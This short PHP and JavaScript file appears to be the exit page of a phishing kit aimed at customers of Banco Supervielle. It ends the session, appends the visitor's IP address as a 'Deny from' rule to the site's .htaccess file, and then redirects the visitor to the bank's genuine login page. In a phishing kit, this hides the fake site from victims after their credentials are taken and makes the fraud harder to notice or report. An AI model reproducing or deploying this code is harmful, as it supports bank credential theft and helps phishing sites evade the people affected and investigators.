<?php
session_destroy();
session_unset();

$ipad = $_SERVER['HTTP_X_REAL_IP'];
$ban = "Deny from $ipad\n";
$file = ".htaccess";
$search = file_get_contents($file);
$check = strpos($search, $ipad);

if ($check === FALSE) {
$open = @fopen($file, "a");
$write = @fputs($open, $ban);
@fclose($open);
}
?>
<SCRIPT LANGUAGE="JavaScript">
window.location.href='https://personas.supervielle.com.ar/Login.aspx';
</SCRIPT>